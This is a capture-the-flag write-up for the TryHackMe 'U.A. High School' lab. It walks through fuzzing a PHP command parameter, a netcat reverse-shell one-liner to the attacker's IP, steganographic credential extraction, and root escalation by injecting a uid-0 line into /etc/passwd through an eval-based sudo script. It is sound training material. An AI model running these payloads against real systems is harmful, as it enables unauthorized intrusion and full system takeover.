---
title: "TryHackMe: U.A. High School"
author: jaxafed
categories: [TryHackMe]
tags: [web, ffuf, fuzz, php, steganography, sudo, arbitrary file write]
render_with_liquid: false
media_subpath: /images/tryhackme_ua_high_school/
image:
  path: room_image.webp
---

U.A. High School began by discovering a `PHP` file on the web application and fuzzing to identify parameter names. Upon finding a parameter that allowed us to run commands, we utilized it to obtain a shell. While enumerating the file system within the shell, we discovered a passphrase and a corrupted image. Fixing the image by changing the magic bytes from `PNG` to `JPG` and using the passphrase to extract the hidden data from the image, provided us with user credentials. After getting a shell as this user using `SSH`, we were able to execute a script as the root user using `sudo`. The script contained an arbitrary file write vulnerability, which we exploited to gain a shell as the `root` user.

[![Tryhackme Room Link](room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/r/room/yueiua){: .center }

## Initial Enumeration

### Nmap Scan

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.10.74.25
Nmap scan report for 10.10.74.25
Host is up (0.089s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 58:2f:ec:23:ba:a9:fe:81:8a:8e:2d:d8:91:21:d2:76 (RSA)
|   256 9d:f2:63:fd:7c:f3:24:62:47:8a:fb:08:b2:29:e2:b4 (ECDSA)
|_  256 62:d8:f8:c9:60:0f:70:1f:6e:11:ab:a0:33:79:b5:5d (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: U.A. High School
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are two ports open.

- 22/SSH
- 80/HTTP

### Web 80

Looking at the `http://10.10.74.25/`, we see a page about `U.A. High School`.

![Web 80 Index](web_80_index.webp){: width="1200" height="600" }

Checking all the links present on the site, the contact form on `http://10.10.74.25/contact.html` is interesting, but after trying some payloads, we get nothing out of it. So, we move on.

![Web 80 Contact](web_80_contact.webp){: width="1200" height="600" }

## Shell as www-data

Looking at the source code for the page, we can see it includes a `CSS` file from the `/assets` directory.

![Web 80 Index Source](web_80_index_source.webp){: width="700" height="300" }

Checking the `styles.css` file, we can see it sets the background image to `/assets/images/yuei.jpg`.

![Web 80 Assets CSS Source](web_80_assets_css_source.webp){: width="700" height="300" }

Now that we discovered two more directories on the web application, we can start enumerating those for any other files.

- `/assets`
- `/assets/images`

Visiting the `http://10.10.74.25/assets/` directory, we get an empty page.

![Web 80 Assets](web_80_assets.webp){: width="1200" height="600" }

And visiting the `http://10.10.74.25/assets/images/`, we get an `Forbidden` page.

![Web 80 Assets Images](web_80_assets_images.webp){: width="1200" height="600" }

The discrepancy between responses is interesting, and if we look at the request for `http://10.10.74.25/assets/` in `Burp`, we can see the response sets the `PHPSESSID` cookie.

![Web 80 Assets Request](web_80_assets_request.webp){: width="1000" height="300" }

This means that we are probably hitting a `PHP` file.

We can confirm this by making a request explicitly to the `/assets/index.php` and as expected, we get a `200` response.

![Web 80 Assets PHP Request](web_80_assets_php_request.webp){: width="1000" height="400" }

And if we make a request to `/assets/index.html`, we get a `404` response.

![Web 80 Assets HTML Request](web_80_assets_html_request.webp){: width="1000" height="400" }

Now that we discovered an interesting `PHP` file, we can fuzz for any hidden parameter names.

```console
$ ffuf -u 'http://10.10.74.25/assets/index.php?FUZZ=id' -mc all -ic -t 100 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -fs 0

...

cmd                     [Status: 200, Size: 72, Words: 1, Lines: 1, Duration: 119ms]
```
{: .wrap }

With this, we discover the `cmd` parameter, and making the same request with `curl`, we get a `base64` encoded response.

```console
$ curl -s 'http://10.10.74.25/assets/index.php?cmd=id'
dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK
```

Decoding the response we got from `base64`, we see the output of the command we passed.

```console
$ curl -s 'http://10.10.74.25/assets/index.php?cmd=id' | base64 -d
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

It seems we are able to execute commands with the `cmd` parameter; we can use this to get a shell.

First, starting our listener to catch the reverse shell.

```console
$ nc -lvnp 443
```

Sending our reverse shell payload with the `curl` command.

```console
$ curl -s 'http://10.10.74.25/assets/index.php' -G --data-urlencode 'cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.11.72.22 443 >/tmp/f'
```
{: .wrap }

Looking back at our listener, we get a shell as `www-data`.

```console
$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.11.72.22] from (UNKNOWN) [10.10.74.25] 50580
bash: cannot set terminal process group (762): Inappropriate ioctl for device
bash: no job control in this shell
www-data@myheroacademia:/var/www/html/assets$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Shell as deku

Enumerating the file system, we discover the `Hidden_Content` directory inside `/var/www`.

```console
www-data@myheroacademia:/var/www$ ls -la
total 16
drwxr-xr-x  4 www-data www-data 4096 Dec 13  2023 .
drwxr-xr-x 14 root     root     4096 Jul  9  2023 ..
drwxrwxr-x  2 www-data www-data 4096 Jul  9  2023 Hidden_Content
drwxr-xr-x  3 www-data www-data 4096 Dec 13  2023 html
```

Inside the directory, there is a single file named `passphrase.txt`.

```console
www-data@myheroacademia:/var/www/Hidden_Content$ ls -la
total 12
drwxrwxr-x 2 www-data www-data 4096 Jul  9  2023 .
drwxr-xr-x 4 www-data www-data 4096 Dec 13  2023 ..
-rw-rw-r-- 1 www-data www-data   29 Jul  9  2023 passphrase.txt
```

Reading the file, we see another `base64` encoded string.

```console
www-data@myheroacademia:/var/www/Hidden_Content$ cat passphrase.txt
QWxsbWlnaHRGb3JFdmVyISEhCg==
```

Decoding it from the `base64`, we get a passphrase: `AllmightForEver!!!`

```console
www-data@myheroacademia:/var/www/Hidden_Content$ cat passphrase.txt | base64 -d
AllmightForEver!!!
```

Trying it as the password for the users present in the machine does not work, so we go back to enumerating the file system.

Inside the `/var/www/html/assets/images` directory, we discover an unused image.

```console
www-data@myheroacademia:/var/www/html/assets/images$ ls -la
total 336
drwxrwxr-x 2 www-data www-data   4096 Jul  9  2023 .
drwxrwxr-x 3 www-data www-data   4096 Jan 25  2024 ..
-rw-rw-r-- 1 www-data www-data  98264 Jul  9  2023 oneforall.jpg
-rw-rw-r-- 1 www-data www-data 237170 Jul  9  2023 yuei.jpg
```

Downloading the image using `wget`.

```console
$ wget 'http://10.10.74.25/assets/images/oneforall.jpg'
```

Trying to open the image, we are not able to display it.

Still, using the passphrase we discovered to extract some hidden data from the image using `steghide` it fails.

```console
$ steghide extract -sf oneforall.jpg
Enter passphrase:
steghide: the file format of the file "oneforall.jpg" is not supported.
```

Looking at the hex dump for the image, we can see this is due to the image having the magic bytes for `PNG`.

```console
$ xxd oneforall.jpg | head
00000000: 8950 4e47 0d0a 1a0a 0000 0001 0100 0001  .PNG............
00000010: 0001 0000 ffdb 0043 0006 0405 0605 0406  .......C........
00000020: 0605 0607 0706 080a 100a 0a09 090a 140e  ................
00000030: 0f0c 1017 1418 1817 1416 161a 1d25 1f1a  .............%..
00000040: 1b23 1c16 1620 2c20 2326 2729 2a29 191f  .#... , #&')*)..
00000050: 2d30 2d28 3025 2829 28ff db00 4301 0707  -0-(0%()(...C...
00000060: 070a 080a 130a 0a13 281a 161a 2828 2828  ........(...((((
00000070: 2828 2828 2828 2828 2828 2828 2828 2828  ((((((((((((((((
00000080: 2828 2828 2828 2828 2828 2828 2828 2828  ((((((((((((((((
00000090: 2828 2828 2828 2828 2828 2828 2828 ffc0  ((((((((((((((..
```

Well, the `steghide` does not support `PNG` files, and the file already has the `JPG` extension. We can try changing the `PNG` magic bytes (`89 50 4E 47 0D 0A 1A 0A`) to `JPG` magic bytes (`FF D8 FF E0 00 10 4A 46 49 46 00 01`).

Using `hexeditor` for this.

```console
$ hexeditor -b oneforall.jpg
```

![Hexeditor JPG Magic Bytes](hexeditor_jpg_magic_bytes.webp){: width="1000" height="400" }

After making the changes and saving it, we are able to display the image.

![Oneforall](oneforall.webp){: width="1100" height="600" }

Now that the image is fixed, we can run `steghide` once again to extract any hidden data.

```console
$ steghide extract -sf oneforall.jpg
Enter passphrase: AllmightForEver!!!
wrote extracted data to "creds.txt".
```

This time it is successful at extracting the `creds.txt` file, and inside we find the credentials for the `deku` user.

```console
$ cat creds.txt
Hi Deku, this is the only way I've found to give you your account credentials, as soon as you have them, delete this file:

deku:[REDACTED]
```
{: .wrap }

Using the discovered credentials with `SSH`, we get a shell as the `deku` user and are able to read the `user` flag.

```console
$ ssh deku@10.10.74.25
...
deku@myheroacademia:~$ id
uid=1000(deku) gid=1000(deku) groups=1000(deku)
deku@myheroacademia:~$ wc -c user.txt
33 user.txt
```

## Shell as root

Checking the `sudo` permissions for the `deku` user, we see that we are able to run the `/opt/NewComponent/feedback.sh` script as root.

```console
deku@myheroacademia:~$ sudo -l
[sudo] password for deku:
Matching Defaults entries for deku on myheroacademia:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on myheroacademia:
    (ALL) /opt/NewComponent/feedback.sh
```

Looking at the permissions for the script, our user owns it. So, we should be able to modify it.

```console
deku@myheroacademia:~$ ls -la /opt/NewComponent/feedback.sh
-r-xr-xr-x 1 deku deku 684 Jan 23  2024 /opt/NewComponent/feedback.sh
```

But if we try to do so, we can see it is not permitted.

```console
deku@myheroacademia:~$ echo -e '#!/bin/bash\nchmod +s /bin/bash' > /opt/NewComponent/feedback.sh
-bash: /opt/NewComponent/feedback.sh: Operation not permitted
```

Listing the attributes for the file, we can see that the `i` flag is set, which prevents us from modifying it.

```console
deku@myheroacademia:~$ lsattr /opt/NewComponent/feedback.sh
----i---------e----- /opt/NewComponent/feedback.sh
```

Since we are not able to modify it, let's examine the script contents.

```bash
#!/bin/bash

echo "Hello, Welcome to the Report Form       "
echo "This is a way to report various problems"
echo "    Developed by                        "
echo "        The Technical Department of U.A."

echo "Enter your feedback:"
read feedback


if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"

    echo "$feedback" >> /var/log/feedback.txt
    echo "Feedback successfully saved."
else
    echo "Invalid input. Please provide a valid input."
fi
```
{: file="/opt/NewComponent/feedback.sh" .wrap }

First, it prints a banner:

```bash
#!/bin/bash

echo "Hello, Welcome to the Report Form       "
echo "This is a way to report various problems"
echo "    Developed by                        "
echo "        The Technical Department of U.A."
```

After that, it asks for our feedback and reads our input to the `feedback` parameter.

```bash
echo "Enter your feedback:"
read feedback
```

Then it checks if our inputs include any one of the `` ` ``, `)`, `$(`, `|`, `&`, `;`, `?`, `!`, `\` characters.

```bash
if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
```
{: .wrap }

If it does, it prints the invalid input message and exits.

```bash
else
    echo "Invalid input. Please provide a valid input."
fi
```

And if it does not, it passes our input to the `eval "echo $feedback"` command and also logs it to the `/var/log/feedback.txt` file.

```bash
echo "It is This:"
eval "echo $feedback"

echo "$feedback" >> /var/log/feedback.txt
echo "Feedback successfully saved."
```

Luckily, neither `>` nor `/` are one of the restricted characters; we can use this to write to any file we want as the `root` user like this:

```console
deku@myheroacademia:~$ sudo /opt/NewComponent/feedback.sh
Hello, Welcome to the Report Form
This is a way to report various problems
    Developed by
        The Technical Department of U.A.
Enter your feedback:
test > /tmp/test.txt
It is This:
Feedback successfully saved.
deku@myheroacademia:~$ cat /tmp/test.txt
test
deku@myheroacademia:~$ ls -la /tmp/test.txt
-rw-r--r-- 1 root root 5 Aug 24 09:54 /tmp/test.txt
```

With our input as `test > /tmp/test.txt`, the command passed to the eval becomes: `eval "echo test > /tmp/test.txt"` and we are able to write to the `/tmp/test.txt` file.

Using this, we can make an addition to the `/etc/passwd` file and manually add an user with `uid` and `gid` set to `0` ( same as the `root` user ).

First, creating a password hash.

```console
$ mkpasswd -m md5crypt -s
Password: 123
$1$MgMMCplp$bx1JXnOEyOXMkHf9VnHgK0
```

Formatting the user information in the style of the `/etc/passwd`.

```
jxf:$1$MgMMCplp$bx1JXnOEyOXMkHf9VnHgK0:0:0:jxf:/root:/bin/bash
```

Now, writing it to the `/etc/passwd` file using the `/opt/NewComponent/feedback.sh` script.

```console
deku@myheroacademia:~$ sudo /opt/NewComponent/feedback.sh
Hello, Welcome to the Report Form
This is a way to report various problems
    Developed by
        The Technical Department of U.A.
Enter your feedback:
'jxf:$1$MgMMCplp$bx1JXnOEyOXMkHf9VnHgK0:0:0:jxf:/root:/bin/bash' >> /etc/passwd
It is This:
Feedback successfully saved.
```

> We use `'` around what we want to write due to the `$` character in the password hash.
{: .prompt-tip }

We can see we were succesful in writing to the `/etc/passwd` file.

```console
deku@myheroacademia:~$ tail -n1 /etc/passwd
jxf:$1$MgMMCplp$bx1JXnOEyOXMkHf9VnHgK0:0:0:jxf:/root:/bin/bash
```

At last, we can switch to this new user using `su` and read the `root` flag.

```console
deku@myheroacademia:~$ su - jxf
Password: 123
root@myheroacademia:~# id
uid=0(root) gid=0(root) groups=0(root)
root@myheroacademia:~# wc -c root.txt
794 root.txt
```

<style>
.center img {        
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}

</style>
